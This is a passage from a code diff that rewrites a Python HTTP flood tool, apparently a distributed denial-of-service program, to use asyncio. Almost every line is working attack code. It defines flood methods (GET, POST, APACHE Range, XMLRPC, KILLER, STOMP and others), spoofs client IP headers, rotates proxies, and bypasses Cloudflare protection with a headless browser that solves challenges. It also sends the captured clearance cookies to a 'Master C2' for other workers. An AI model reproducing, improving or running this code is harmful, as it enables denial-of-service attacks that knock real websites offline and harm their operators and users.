+                await loop.sock_connect(sock, host or self._raw_target)
+
+            if self._target.scheme.lower() == "https":
+                reader, writer = await asyncio.open_connection(
+                    sock=sock, 
+                    ssl=ctx, 
+                    server_hostname=self._target.host
+                )
+            else:
+                reader, writer = await asyncio.open_connection(sock=sock)
+            
+            return reader, writer
+        except Exception as e:
+            # logger.debug(f"[!] Connection failed: {e}")
+            if proxy and self._proxy_pool:
+                self._proxy_pool.report_failure(proxy)
+            raise
+
+    async def HEAD(self) -> None:
+        """High-efficiency HEAD flood."""
+        payload = self.generate_payload()
+        try:
+            reader, writer = await self.open_connection()
+            async with writer:
+                for _ in range(self._rpc):
+                    await self._send_async(writer, payload, reader)
+                    await asyncio.sleep(0)
+        except Exception:
+            pass
+
+    _sample_count = 0
+
+    async def _send_async(self, writer: asyncio.StreamWriter, data: bytes, reader: asyncio.StreamReader = None):
+        global BYTES_SEND, REQUESTS_SENT, SUCCESS_SENT, WAF_SENT, ERROR_SENT, TIMEOUT_SENT
+        try:
+            writer.write(data)
+            await writer.drain()
+            BYTES_SEND += len(data)
+            REQUESTS_SENT += 1
+
+            # Sampling: Every 50 requests, try to read the status line if reader is provided
+            if reader and HttpFlood._sample_count % 50 == 0:
+                try:
+                    # Short timeout for sampling to avoid stalling the attack
+                    line = await asyncio.wait_for(reader.readline(), timeout=1.0)
+                    if line:
+                        status_line = line.decode().upper()
+                        if "HTTP/" in status_line:
+                            parts = status_line.split()
+                            if len(parts) >= 2:
+                                code = parts[1]
+                                if code.startswith(('2', '3')):
+                                    SUCCESS_SENT += 1
+                                elif code.startswith('4'):
+                                    WAF_SENT += 1
+                                elif code.startswith('5'):
+                                    ERROR_SENT += 1
+                except asyncio.TimeoutError:
+                    TIMEOUT_SENT += 1
+                except:
+                    pass
+            
+            HttpFlood._sample_count += 1
+        except (ConnectionResetError, BrokenPipeError, TimeoutError):
+            TIMEOUT_SENT += 1
+            raise
+        except Exception:
+            raise
 
     @property
     def randHeadercontent(self) -> str:
@@ -1765,52 +2498,56 @@ class HttpFlood(Thread):
             )
         )
 
-    def POST(self) -> None:
-        payload = self.generate_payload(
-            (
-                "Content-Length: 44\r\n"
-                "X-Requested-With: XMLHttpRequest\r\n"
-                "Content-Type: application/json\r\n\r\n"
-                '{"data": %s}'
-            )
-            % ProxyTools.Random.rand_str(32)
-        )[:-2]
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                Tools.send(s, payload)
-        Tools.safe_close(s)
-
-    def TOR(self) -> None:
-        provider = "." + randchoice(tor2webs)
-        target = self._target.authority.replace(".onion", provider)
-        payload = str.encode(
-            self._payload + f"Host: {target}\r\n" + self.randHeadercontent + "\r\n"
+    async def POST(self) -> None:
+        extra = (
+            b"Content-Length: 44\r\n"
+            b"X-Requested-With: XMLHttpRequest\r\n"
+            b"Content-Type: application/json\r\n\r\n"
+            b'{"data": "' + ProxyTools.Random.rand_str(32).encode() + b'"}'
         )
-        s = None
+        payload = self.generate_payload(extra)
+        try:
+            reader, writer = await self.open_connection()
+            async with writer:
+                for _ in range(self._rpc):
+                    await self._send_async(writer, payload, reader)
+                    await asyncio.sleep(0)
+        except: pass
+
+    async def TOR(self) -> None:
+        provider = "." + randchoice(tor2webs)
+        target_host = self._target.authority.replace(".onion", provider)
+        payload = b"".join([
+            self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
+            b"Host: ", target_host.encode(), b"\r\n",
+            b"Connection: keep-alive\r\n\r\n"
+        ])
         target = self._target.host.replace(".onion", provider), self._raw_target[1]
-        with suppress(Exception), self.open_connection(target) as s:
-            for _ in range(self._rpc):
-                Tools.send(s, payload)
-        Tools.safe_close(s)
+        try:
+            reader, writer = await self.open_connection(target)
+            async with writer:
+                for _ in range(self._rpc):
+                    await self._send_async(writer, payload, reader)
+                    await asyncio.sleep(0)
+        except: pass
 
-    def STRESS(self) -> None:
-        payload = self.generate_payload(
-            (
-                "Content-Length: 524\r\n"
-                "X-Requested-With: XMLHttpRequest\r\n"
-                "Content-Type: application/json\r\n\r\n"
-                '{"data": %s}'
-            )
-            % ProxyTools.Random.rand_str(512)
-        )[:-2]
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                Tools.send(s, payload)
-        Tools.safe_close(s)
+    async def STRESS(self) -> None:
+        extra = (
+            b"Content-Length: 524\r\n"
+            b"X-Requested-With: XMLHttpRequest\r\n"
+            b"Content-Type: application/json\r\n\r\n"
+            b'{"data": "' + ProxyTools.Random.rand_str(512).encode() + b'"}'
+        )
+        payload = self.generate_payload(extra)
+        try:
+            reader, writer = await self.open_connection()
+            async with writer:
+                for _ in range(self._rpc):
+                    await self._send_async(writer, payload, reader)
+                    await asyncio.sleep(0)
+        except: pass
 
-    def COOKIES(self) -> None:
+    async def COOKIES(self) -> None:
         payload = self.generate_payload(
             "Cookie: _ga=GA%s; _gat=1; __cfduid=dc232334gwdsd23434542342342342475611928; %s=%s\r\n"
             % (
@@ -1819,23 +2556,27 @@ class HttpFlood(Thread):
                 ProxyTools.Random.rand_str(32),
             )
         )
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                Tools.send(s, payload)
-        Tools.safe_close(s)
+        try:
+            reader, writer = await self.open_connection()
+            async with writer:
+                for _ in range(self._rpc):
+                    await self._send_async(writer, payload, reader)
+                    await asyncio.sleep(0)
+        except: pass
 
-    def APACHE(self) -> None:
+    async def APACHE(self) -> None:
         payload = self.generate_payload(
             "Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024))
         )
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                Tools.send(s, payload)
-        Tools.safe_close(s)
+        try:
+            reader, writer = await self.open_connection()
+            async with writer:
+                for _ in range(self._rpc):
+                    await self._send_async(writer, payload, reader)
+                    await asyncio.sleep(0)
+        except: pass
 
-    def XMLRPC(self) -> None:
+    async def XMLRPC(self) -> None:
         payload = self.generate_payload(
             (
                 "Content-Length: 345\r\n"
@@ -1849,139 +2590,240 @@ class HttpFlood(Thread):
             )
             % (ProxyTools.Random.rand_str(64), ProxyTools.Random.rand_str(64))
         )[:-2]
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                Tools.send(s, payload)
-        Tools.safe_close(s)
+        try:
+            reader, writer = await self.open_connection()
+            async with writer:
+                for _ in range(self._rpc):
+                    await self._send_async(writer, payload, reader)
+                    await asyncio.sleep(0)
+        except: pass
 
-    def PPS(self) -> None:
-        payload = str.encode(
-            self._defaultpayload + f"Host: {self._target.authority}\r\n\r\n"
-        )
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                Tools.send(s, payload)
-        Tools.safe_close(s)
+    async def PPS(self) -> None:
+        payload = b"".join([
+            self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
+            b"Host: ", self._host_bytes, b"\r\n\r\n"
+        ])
+        try:
+            reader, writer = await self.open_connection()
+            async with writer:
+                for _ in range(self._rpc):
+                    await self._send_async(writer, payload, reader)
+                    await asyncio.sleep(0)
+        except: pass
 
-    def KILLER(self) -> None:
-        while True:
-            Thread(target=self.GET, daemon=True).start()
+    async def KILLER(self) -> None:
+        tasks = []
+        for _ in range(10):
+            tasks.append(asyncio.create_task(self.GET()))
+        await asyncio.gather(*tasks)
 
-    def GET(self) -> None:
+    async def GET(self) -> None:
         payload = self.generate_payload()
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                Tools.send(s, payload)
-        Tools.safe_close(s)
+        try:
+            reader, writer = await self.open_connection()
+            async with writer:
+                for _ in range(self._rpc):
+                    await self._send_async(writer, payload, reader)
+                    await asyncio.sleep(0)
+        except Exception:
+            pass
 
-    def BOT(self) -> None:
+    async def BOT(self) -> None:
         payload = self.generate_payload()
-        p1 = str.encode(
-            "GET /robots.txt HTTP/1.1\r\nHost: %s\r\nConnection: Keep-Alive\r\nAccept: text/plain,text/html,*/*\r\nUser-Agent: %s\r\nAccept-Encoding: gzip,deflate,br\r\n\r\n"
-            % (self._target.raw_authority, randchoice(search_engine_agents))
-        )
-        p2 = str.encode(
-            "GET /sitemap.xml HTTP/1.1\r\nHost: %s\r\nConnection: Keep-Alive\r\nAccept: */*\r\nFrom: googlebot(at)googlebot.com\r\nUser-Agent: %s\r\nAccept-Encoding: gzip,deflate,br\r\nIf-None-Match: %s-%s\r\nIf-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n"
-            % (
-                self._target.raw_authority,
-                randchoice(search_engine_agents),
-                ProxyTools.Random.rand_str(9),
-                ProxyTools.Random.rand_str(4),
-            )
-        )
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            Tools.send(s, p1)
-            Tools.send(s, p2)
-            for _ in range(self._rpc):
-                Tools.send(s, payload)
-        Tools.safe_close(s)
+        p1 = b"".join([
+            b"GET /robots.txt HTTP/1.1\r\nHost: ", self._target.raw_authority.encode(),
+            b"\r\nConnection: Keep-Alive\r\nAccept: text/plain,text/html,*/*\r\nUser-Agent: ",
+            randchoice(search_engine_agents).encode(), b"\r\nAccept-Encoding: gzip,deflate,br\r\n\r\n"
+        ])
+        p2 = b"".join([
+            b"GET /sitemap.xml HTTP/1.1\r\nHost: ", self._target.raw_authority.encode(),
+            b"\r\nConnection: Keep-Alive\r\nAccept: */*\r\nFrom: googlebot(at)googlebot.com\r\nUser-Agent: ",
+            randchoice(search_engine_agents).encode(), b"\r\nAccept-Encoding: gzip,deflate,br\r\nIf-None-Match: ",
+            ProxyTools.Random.rand_str(9).encode(), b"-", ProxyTools.Random.rand_str(4).encode(),
+            b"\r\nIf-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n"
+        ])
+        try:
+            reader, writer = await self.open_connection()
+            async with writer:
+                await self._send_async(writer, p1)
+                await self._send_async(writer, p2)
+                for _ in range(self._rpc):
+                    await self._send_async(writer, payload, reader)
+                    await asyncio.sleep(0)
+        except: pass
 
-    def EVEN(self) -> None:
+    async def EVEN(self) -> None:
         payload = self.generate_payload()
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            while Tools.send(s, payload) and s.recv(1):
-                continue
-        Tools.safe_close(s)
+        try:
+            reader, writer = await self.open_connection()
+            async with writer:
+                while True:
+                    await self._send_async(writer, payload, reader)
+                    if not await reader.read(1):
+                        break
+        except: pass
 
-    def OVH(self) -> None:
+    async def OVH(self) -> None:
         payload = self.generate_payload()
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(min(self._rpc, 5)):
-                Tools.send(s, payload)
-        Tools.safe_close(s)
+        try:
+            reader, writer = await self.open_connection()
+            async with writer:
+                for _ in range(min(self._rpc, 5)):
+                    await self._send_async(writer, payload, reader)
+        except: pass
 
-    def CFB(self) -> None:
+    async def CFB(self) -> None:
+        """
+        Enhanced Cloudflare Bypass: 
+        Uses shared cf_clearance cookies if available for high-speed flooding.
+        Falls back to synchronous cloudscraper if no clearance is found.
+        """
+        # If we have a valid clearance from CFBUAM, use the fast path
+        if HttpFlood._cfbuam_cookie and HttpFlood._cfbuam_cookie != "_yummy=choco":
+            try:
+                # Reuse the logic from CFBUAM but optimized for mass-async
+                ua_bytes = (HttpFlood._cfbuam_ua or randchoice(self._useragents)).encode()
+                cookie_bytes = f"Cookie: {HttpFlood._cfbuam_cookie}\r\n".encode()
+                spoof = ProxyTools.Random.rand_ipv4().encode()
+                ref = (randchoice(self._referers) + parse.quote(self._target.human_repr())).encode()
+
+                req = b"".join([
+                    self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
+                    b"Host: ", self._host_bytes, b"\r\n",
+                    cookie_bytes,
+                    b"Connection: ", self._conn_type_bytes, b"\r\n",
+                    b"User-Agent: ", ua_bytes, b"\r\n",
+                    b"Referer: ", ref, b"\r\n",
+                    self._fp_headers_bytes,
+                    b"X-Forwarded-For: ", spoof, b"\r\n",
+                    b"Client-IP: ", spoof, b"\r\n",
+                    b"Real-IP: ", spoof, b"\r\n",
+                    b"\r\n"
+                ])
+
+                reader, writer = await self.open_connection()
+                async with writer:
+                    for _ in range(self._rpc):
+                        await self._send_async(writer, req)
+                return
+            except Exception:
+                pass # Fallback to scraper on connection failure
+
+        # Legacy/Fallback Path: Synchronous Scraper
+        loop = asyncio.get_event_loop()
+        await loop.run_in_executor(SYNC_EXECUTOR, self._sync_CFB)
+
+    _scraper_cache = {}
+
+    def _sync_CFB(self):
         global REQUESTS_SENT, BYTES_SEND
-        pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
-        s = None
-        with suppress(Exception), create_scraper() as s:
-            for _ in range(self._rpc):
-                if pro:
-                    with s.get(
-                        self._target.human_repr(), proxies=pro.asRequest(), timeout=5
-                    ) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
-                        continue
-                with s.get(self._target.human_repr(), timeout=5) as res:
-                    REQUESTS_SENT += 1
-                    BYTES_SEND += Tools.sizeOfRequest(res)
-        Tools.safe_close(s)
+        
+        # Use thread-local or cached scraper to reduce CPU overhead
+        thread_id = current_thread().ident
+        scraper = HttpFlood._scraper_cache.get(thread_id)
+        
+        if not scraper:
+            try:
+                scraper = create_scraper()
+                HttpFlood._scraper_cache[thread_id] = scraper
+            except Exception:
+                return
 
-    def CFBUAM(self) -> None:
+        for _ in range(self._rpc):
+            pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
+            try:
+                res = scraper.get(
+                    self._target.human_repr(),
+                    proxies=pro.asRequest() if pro else None,
+                    timeout=5
+                )
+                BYTES_SEND += len(res.content) + len(str(res.headers))
+                REQUESTS_SENT += 1
+            except Exception:
+                if pro and self._proxy_pool:
+                    self._proxy_pool.report_failure(pro)
+
+    _cfbuam_expiry = 0
+
+    async def CFBUAM(self) -> None:
         """
         Cloudflare UAM Bypass using Headless Browser.
-        Solves the JS challenge once globally, then all threads use the synced cookies.
+        Solves the JS challenge once globally, then all tasks use the synced cookies.
         """
-        if not HttpFlood._cfbuam_cookie:
-            with HttpFlood._cfbuam_lock:
-                if not HttpFlood._cfbuam_cookie: # Double-checked locking
+        now = time()
+        # Re-solve if no cookie, fallback cookie detected, or 15 mins passed
+        if not HttpFlood._cfbuam_cookie or HttpFlood._cfbuam_cookie == "_yummy=choco" or now > HttpFlood._cfbuam_expiry:
+            async with HttpFlood._cfbuam_lock:
+                # Double-checked locking with 60s cooldown between re-solve attempts
+                if (not HttpFlood._cfbuam_cookie or HttpFlood._cfbuam_cookie == "_yummy=choco" or now > HttpFlood._cfbuam_expiry) and (now - getattr(HttpFlood, '_last_solve_attempt', 0) > 60):
+                    HttpFlood._last_solve_attempt = now
                     proxy_str = str(self._proxy_pool.get_proxy()) if self._proxy_pool else None
-                    cookie, ua = BrowserEngine.solve_cf(str(self._target), proxy=proxy_str)
+                    # Try with latest ML User-Agent
+                    ua_target = ML_ENGINE.get_fingerprint()["ua"]
+                    cookie, ua = await asyncio.to_thread(BrowserEngine.solve_cf, str(self._target), proxy=proxy_str, user_agent=ua_target)
+                    
+                    if not cookie and proxy_str:
+                        logger.warning(f"{bcolors.WARNING}[!] CFBUAM: Solve failed with proxy. Retrying without proxy...{bcolors.RESET}")
+                        cookie, ua = await asyncio.to_thread(BrowserEngine.solve_cf, str(self._target), user_agent=ua_target)
+
                     if cookie:
                         HttpFlood._cfbuam_cookie = cookie
                         if ua: HttpFlood._cfbuam_ua = ua
+                        HttpFlood._cfbuam_expiry = now + 900 # 15 mins
                     else:
                         HttpFlood._cfbuam_cookie = "_yummy=choco" # Fallback
+                        HttpFlood._cfbuam_expiry = now + 60    # Retry sooner if failed
 
-        req = (
-            self._payload
-            + f"Host: {self._target.authority}\r\n"
-            + f"Cookie: {HttpFlood._cfbuam_cookie}\r\n"
-        )
+        ua_bytes = (HttpFlood._cfbuam_ua or randchoice(self._useragents)).encode()
+        cookie_bytes = f"Cookie: {HttpFlood._cfbuam_cookie}\r\n".encode()
+        spoof = ProxyTools.Random.rand_ipv4().encode()
+        ref = (randchoice(self._referers) + parse.quote(self._target.human_repr())).encode()
+
+        req = b"".join([
+            self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
+            b"Host: ", self._host_bytes, b"\r\n",
+            cookie_bytes,
+            b"Connection: ", self._conn_type_bytes, b"\r\n",
+            b"User-Agent: ", ua_bytes, b"\r\n",
+            b"Referer: ", ref, b"\r\n",
+            self._fp_headers_bytes,
+            b"X-Forwarded-For: ", spoof, b"\r\n",
+            b"Client-IP: ", spoof, b"\r\n",
+            b"Real-IP: ", spoof, b"\r\n",
+            b"\r\n"
+        ])
         
-        # Override UA if we got one from browser, else use the evasion/randomized one
-        if HttpFlood._cfbuam_ua:
-            req += f"User-Agent: {HttpFlood._cfbuam_ua}\r\n"
-            req += f"Referer: {self._target.human_repr()}\r\n"
-            req += self.SpoofIP
-        else:
-            req += self.randHeadercontent
+        # Broadcast bypass tokens to Master C2 if in worker mode and connected
+        if _session_id and "cf_clearance" in HttpFlood._cfbuam_cookie and HttpFlood._cfbuam_cookie != "_yummy=choco":
+            import json
+            # Print to stdout so worker.py can catch it and send via WS
+            # We use a special tag that worker.py's monitor_process will parse
+            print(f"__SYNC_BYPASS__||{json.dumps({'cookie': HttpFlood._cfbuam_cookie, 'ua': HttpFlood._cfbuam_ua})}")
 
-        req += "\r\n"
+        try:
+            reader, writer = await self.open_connection()
+            async with writer:
+                for _ in range(self._rpc):
+                    await self._send_async(writer, req)
+        except Exception as e:
+            # print("CFBUAM EXCEPTION:", repr(e))
+            pass
 
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                Tools.send(s, str.encode(req))
-        Tools.safe_close(s)
-
-    def AVB(self) -> None:
+    async def AVB(self) -> None:
         payload = self.generate_payload()
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                sleep(max(self._rpc / 1000, 1))
-                Tools.send(s, payload)
-        Tools.safe_close(s)
+        try:
+            reader, writer = await self.open_connection()
+            async with writer:
+                for _ in range(self._rpc):
+                    await asyncio.sleep(max(self._rpc / 1000, 0.1))
+                    await self._send_async(writer, payload, reader)
+        except: pass
 
-    def DGB(self) -> None:
+    async def DGB(self) -> None:
+        loop = asyncio.get_event_loop()
+        await loop.run_in_executor(SYNC_EXECUTOR, self._sync_DGB)
+
+    def _sync_DGB(self):
         global REQUESTS_SENT, BYTES_SEND
         with suppress(Exception):
             if self._proxy_pool:
@@ -2014,189 +2856,280 @@ class HttpFlood(Thread):
                         BYTES_SEND += Tools.sizeOfRequest(res)
             Tools.safe_close(ss)
 
-    def DYN(self) -> None:
-        payload = str.encode(
-            self._payload
-            + f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n"
-            + self.randHeadercontent
-            + "\r\n"
-        )
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                Tools.send(s, payload)
-        Tools.safe_close(s)
+    async def DYN(self) -> None:
+        try:
+            reader, writer = await self.open_connection()
+            async with writer:
+                for _ in range(self._rpc):
+                    spoof = ProxyTools.Random.rand_ipv4().encode()
+                    ua = randchoice(self._useragents).encode()
+                    ref = (randchoice(self._referers) + parse.quote(self._target.human_repr())).encode()
+                    payload = b"".join([
+                        self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
+                        b"Host: ", ProxyTools.Random.rand_str(6).encode(), b".", self._host_bytes, b"\r\n",
+                        b"Connection: ", self._conn_type_bytes, b"\r\n",
+                        b"User-Agent: ", ua, b"\r\n",
+                        b"Referer: ", ref, b"\r\n",
+                        self._fp_headers_bytes,
+                        b"X-Forwarded-For: ", spoof, b"\r\n",
+                        b"Client-IP: ", spoof, b"\r\n",
+                        b"Real-IP: ", spoof, b"\r\n\r\n"
+                    ])
+                    await self._send_async(writer, payload, reader)
+                    await asyncio.sleep(0)
+        except: pass
 
-    def DOWNLOADER(self) -> None:
+    async def DOWNLOADER(self) -> None:
         payload = self.generate_payload()
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                Tools.send(s, payload)
-                while 1:
-                    sleep(0.01)
-                    data = s.recv(1)
-                    if not data:
-                        break
-            Tools.send(s, b"0")
-        Tools.safe_close(s)
+        try:
+            reader, writer = await self.open_connection()
+            async with writer:
+                for _ in range(self._rpc):
+                    await self._send_async(writer, payload, reader)
+                    await asyncio.sleep(0)
+                    while True:
+                        data = await reader.read(1024)
+                        if not data:
+                            break
+                await self._send_async(writer, b"0")
+        except: pass
 
-    def BYPASS(self) -> None:
+    async def BYPASS(self) -> None:
+        loop = asyncio.get_event_loop()
+        await loop.run_in_executor(SYNC_EXECUTOR, self._sync_BYPASS)
+
+    def _sync_BYPASS(self):
         global REQUESTS_SENT, BYTES_SEND
-        pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
-        s = None
-        with suppress(Exception), Session() as s:
-            for _ in range(self._rpc):
-                if pro:
-                    with s.get(
-                        self._target.human_repr(), proxies=pro.asRequest(), timeout=5
-                    ) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
-                        continue
-                with s.get(self._target.human_repr(), timeout=5) as res:
+        for _ in range(self._rpc):
+            pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
+            try:
+                with requests.get(
+                    self._target.human_repr(),
+                    proxies=pro.asRequest() if pro else None,
+                    timeout=5
+                ) as res:
+                    BYTES_SEND += len(res.content) + len(str(res.headers))
                     REQUESTS_SENT += 1
-                    BYTES_SEND += Tools.sizeOfRequest(res)
-        Tools.safe_close(s)
+            except Exception:
+                if pro and self._proxy_pool:
+                    self._proxy_pool.report_failure(pro)
 
-    def GSB(self) -> None:
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                payload = str.encode(
-                    "%s %s?qs=%s HTTP/1.1\r\nHost: %s\r\n%sAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
-                    % (
-                        self._req_type,
-                        self._target.raw_path_qs,
-                        ProxyTools.Random.rand_str(6),
-                        self._target.authority,
-                        self.randHeadercontent,
-                    )
-                )
-                Tools.send(s, payload)
-        Tools.safe_close(s)
+    async def GSB(self) -> None:
+        try:
+            reader, writer = await self.open_connection()
+            async with writer:
+                for _ in range(self._rpc):
+                    spoof = ProxyTools.Random.rand_ipv4().encode()
+                    ua = randchoice(self._useragents).encode()
+                    ref = (randchoice(self._referers) + parse.quote(self._target.human_repr())).encode()
+                    payload = b"".join([
+                        self._method_bytes, b" ", self._path_bytes, b"?qs=", ProxyTools.Random.rand_str(6).encode(), b" HTTP/1.1\r\n",
+                        b"Host: ", self._host_bytes, b"\r\n",
+                        b"Connection: ", self._conn_type_bytes, b"\r\n",
+                        b"User-Agent: ", ua, b"\r\n",
+                        b"Referer: ", ref, b"\r\n",
+                        self._fp_headers_bytes,
+                        b"X-Forwarded-For: ", spoof, b"\r\n",
+                        b"Client-IP: ", spoof, b"\r\n",
+                        b"Real-IP: ", spoof, b"\r\n\r\n"
+                    ])
+                    await self._send_async(writer, payload, reader)
+                    await asyncio.sleep(0)
+        except: pass
 
-    def RHEX(self) -> None:
-        randhex = str(randbytes(randchoice([32, 64, 128])))
-        payload = str.encode(
-            "%s %s/%s HTTP/1.1\r\nHost: %s/%s\r\n%sAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: none\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
-            % (
-                self._req_type,
-                self._target.authority,
-                randhex,
-                self._target.authority,
-                randhex,
-                self.randHeadercontent,
-            )
-        )
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                Tools.send(s, payload)
-        Tools.safe_close(s)
+    async def RHEX(self) -> None:
+        try:
+            reader, writer = await self.open_connection()
+            async with writer:
+                for _ in range(self._rpc):
+                    spoof = ProxyTools.Random.rand_ipv4().encode()
+                    ua = randchoice(self._useragents).encode()
+                    ref = (randchoice(self._referers) + parse.quote(self._target.human_repr())).encode()
+                    randhex = randbytes(randchoice([32, 64, 128])).hex().encode()
+                    payload = b"".join([
+                        self._method_bytes, b" ", self._path_bytes, b"/", randhex, b" HTTP/1.1\r\n",
+                        b"Host: ", self._host_bytes, b"/", randhex, b"\r\n",
+                        b"Connection: ", self._conn_type_bytes, b"\r\n",
+                        b"User-Agent: ", ua, b"\r\n",
+                        b"Referer: ", ref, b"\r\n",
+                        self._fp_headers_bytes,
+                        b"X-Forwarded-For: ", spoof, b"\r\n",
+                        b"Client-IP: ", spoof, b"\r\n",
+                        b"Real-IP: ", spoof, b"\r\n\r\n"
+                    ])
+                    await self._send_async(writer, payload, reader)
+                    await asyncio.sleep(0)
+        except: pass
 
-    def STOMP(self) -> None:
-        dep = (
-            "Accept-Encoding: gzip, deflate, br\r\n"
-            "Accept-Language: en-US,en;q=0.9\r\n"
-            "Cache-Control: max-age=0\r\n"
-            "Connection: keep-alive\r\n"
-            "Sec-Fetch-Dest: document\r\n"
-            "Sec-Fetch-Mode: navigate\r\n"
-            "Sec-Fetch-Site: none\r\n"
-            "Sec-Fetch-User: ?1\r\n"
-            "Sec-Gpc: 1\r\n"
-            "Pragma: no-cache\r\n"
-            "Upgrade-Insecure-Requests: 1\r\n\r\n"
-        )
-        hexh = r"\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA\x84\x8B\x87\x8F\x99\x8F\x98\x9C\x8F\x98\xEA "
-        p1, p2 = (
-            str.encode(
-                "%s %s/%s HTTP/1.1\r\nHost: %s/%s\r\n%s%s"
-                % (
-                    self._req_type,
-                    self._target.authority,
-                    hexh,
-                    self._target.authority,
-                    hexh,
-                    self.randHeadercontent,
-                    dep,
-                )
-            ),
-            str.encode(
-                "%s %s/cdn-cgi/l/chk_captcha HTTP/1.1\r\nHost: %s\r\n%s%s"
-                % (
-                    self._req_type,
-                    self._target.authority,
-                    hexh,
-                    self.randHeadercontent,
-                    dep,
-                )
-            ),
-        )
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            Tools.send(s, p1)
-            for _ in range(self._rpc):
-                Tools.send(s, p2)
-        Tools.safe_close(s)
+    async def STOMP(self) -> None:
+        hexh = b"A" * 1024 # Optimized stomp pattern
+        p1 = b"".join([
+            self._method_bytes, b" ", self._path_bytes, b"/", hexh, b" HTTP/1.1\r\n",
+            b"Host: ", self._host_bytes, b"\r\n\r\n"
+        ])
+        p2 = b"".join([
+            self._method_bytes, b" ", self._path_bytes, b"/cdn-cgi/l/chk_captcha HTTP/1.1\r\n",
+            b"Host: ", hexh, b"\r\n\r\n"
+        ])
+        try:
+            reader, writer = await self.open_connection()
+            async with writer:
+                await self._send_async(writer, p1)
+                for _ in range(self._rpc):
+                    await self._send_async(writer, p2)
+        except: pass
 
-    def NULL(self) -> None:
-        payload = str.encode(
-            self._payload
-            + f"Host: {self._target.authority}\r\n"
-            + "User-Agent: null\r\n"
-            + "Referrer: null\r\n"
-            + self.SpoofIP
-            + "\r\n"
-        )
-        s = None
-        with suppress(Exception), self.open_connection() as s:
-            for _ in range(self._rpc):
-                Tools.send(s, payload)
-        Tools.safe_close(s)
+    async def NULL(self) -> None:
+        payload = b"".join([
+            self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
+            b"Host: ", self._host_bytes, b"\r\n",
+            b"User-Agent: null\r\n",
+            b"Referrer: null\r\n",
+            b"Connection: keep-alive\r\n\r\n"
+        ])
+        try:
+            reader, writer = await self.open_connection()
+            async with writer:
+                for _ in range(self._rpc):
+                    await self._send_async(writer, payload, reader)
+                    await asyncio.sleep(0)
+        except: pass
 
-    def BOMB(self) -> None:
